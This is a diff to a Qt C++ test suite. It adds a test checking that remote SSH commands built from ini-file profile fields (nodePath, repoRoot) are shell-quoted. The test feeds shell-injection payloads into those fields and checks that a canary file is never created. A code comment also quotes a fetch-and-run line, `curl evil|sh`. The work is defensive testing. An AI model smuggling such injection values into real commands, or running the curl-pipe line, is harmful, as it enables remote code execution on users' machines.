@@ -20,9 +20,12 @@
 #include "SshConnectionPool.h"
 
 #include <QElapsedTimer>
+#include <QFile>
+#include <QFileInfo>
 #include <QHostAddress>
 #include <QList>
 #include <QPointer>
+#include <QProcess>
 #include <QSignalSpy>
 #include <QTcpServer>
 #include <QTcpSocket>
@@ -256,6 +259,9 @@ private slots:
     void disconnectDuringProbeCutsTheWaitShort();
     void disablingReconnectDuringProbeStopsTheLadder();
     void disconnectMidBackoffStopsImmediately();
+
+    // Remote command construction from attacker-influenced profile fields.
+    void remoteCommandsQuoteHostileProfileFields();
 };
 
 // A cold wire walks Disconnected -> Connecting -> Wired exactly once and hands
@@ -1011,6 +1017,92 @@ void TstSessionBootstrap::disconnectMidBackoffStopsImmediately()
     QCOMPARE(h.boot.state(), State::Disconnected);
     QCOMPARE(h.boot.connectCalls, 1);
     QCOMPARE(h.boot.probeCalls, 1);
+}
+
+// SessionBootstrap::rpcCommand()/bridgeCommand() splice two ServerProfiles
+// fields — nodePath and repoRoot — into a string that an SSH exec request hands
+// straight to the remote LOGIN SHELL. Those fields are attacker-influenced: the
+// profile store is an ini file, and a shared, synced or simply writable one
+// (ServerProfiles::restrictPermissions() narrows it precisely because a
+// group-writable ~/.config is the common case) lets someone else choose them.
+// A nodePath of `sh -c 'curl evil|sh'` or a repoRoot carrying $(...) must be a
+// broken path, never an execution.
+//
+// Proven against a REAL /bin/sh rather than by eyeballing the quoting: each
+// payload tries to create a canary file, and the shell must refuse to make it.
+void TstSessionBootstrap::remoteCommandsQuoteHostileProfileFields()
+{
+    QTemporaryDir dir;
+    QVERIFY(dir.isValid());
+    const QString canary = dir.filePath(QStringLiteral("CANARY"));
+    const QString touch =
+        QStringLiteral("touch ") + canary; // spliced into every payload below
+
+    struct Case {
+        const char* what;
+        QString nodePath;
+        QString repoRoot;
+    };
+    const QList<Case> cases{
+        {"command separator in nodePath",
+         QStringLiteral("node; ") + touch + QStringLiteral("; :"),
+         QStringLiteral("/srv/repo")},
+        {"command substitution in nodePath",
+         QStringLiteral("$(") + touch + QStringLiteral(")node"),
+         QStringLiteral("/srv/repo")},
+        {"backticks in nodePath",
+         QStringLiteral("`") + touch + QStringLiteral("`node"),
+         QStringLiteral("/srv/repo")},
+        {"sh -c payload as the whole nodePath",
+         QStringLiteral("sh -c '") + touch + QStringLiteral("'"),
+         QStringLiteral("/srv/repo")},
+        {"quote break-out in repoRoot", QStringLiteral("/usr/bin/node"),
+         QStringLiteral("/srv'; ") + touch + QStringLiteral("; '")},
+        {"command substitution in repoRoot", QStringLiteral("/usr/bin/node"),
+         QStringLiteral("/srv/$(") + touch + QStringLiteral(")x")},
+        {"newline in repoRoot", QStringLiteral("/usr/bin/node"),
+         QStringLiteral("/srv\n") + touch + QStringLiteral("\nx")},
+        {"boolean chain in repoRoot", QStringLiteral("/usr/bin/node"),
+         QStringLiteral("/srv && ") + touch},
+        {"leading dash in both", QStringLiteral("-rf"), QStringLiteral("-rf")},
+    };
+
+    for (const Case& c : cases) {
+        for (const QString& command :
+             {SessionBootstrap::rpcCommand(c.nodePath, c.repoRoot),
+              SessionBootstrap::bridgeCommand(c.nodePath, c.repoRoot)}) {
+            QFile::remove(canary);
+            QProcess sh;
+            sh.setWorkingDirectory(dir.path());
+            sh.start(QStringLiteral("/bin/sh"),
+                     {QStringLiteral("-c"), command});
+            QVERIFY2(sh.waitForStarted(5000), c.what);
+            // bridgeCommand's watchdog blocks on `cat`; EOF releases it.
+            sh.closeWriteChannel();
+            QVERIFY2(sh.waitForFinished(15000), c.what);
+            QVERIFY2(!QFileInfo::exists(canary),
+                     qPrintable(QStringLiteral("%1: the remote shell EXECUTED "
+                                               "the payload\ncommand: %2")
+                                    .arg(QLatin1String(c.what), command)));
+        }
+    }
+
+    // ...and the quoting is not achieved by mangling honest values: a path with
+    // spaces still reaches the shell as ONE argument.
+    const QString spaced =
+        SessionBootstrap::rpcCommand(QStringLiteral("/opt/my node/bin/node"),
+                                     QStringLiteral("/srv/my repo"));
+    QProcess argv;
+    argv.setWorkingDirectory(dir.path());
+    // Replace the interpreter with a printf that echoes its argv, so the test
+    // observes the SPLIT the shell actually performed.
+    argv.start(QStringLiteral("/bin/sh"),
+               {QStringLiteral("-c"),
+                QString(spaced).replace(QStringLiteral("'/opt/my node/bin/node'"),
+                                        QStringLiteral("printf '[%s]'"))});
+    QVERIFY(argv.waitForFinished(15000));
+    QCOMPARE(QString::fromUtf8(argv.readAllStandardOutput()),
+             QStringLiteral("[/srv/my repo/remote/src/codeharbord.ts][rpc][--stdio]"));
 }
 
 // Guiless: nothing here needs a display, and QTEST_MAIN would pull in
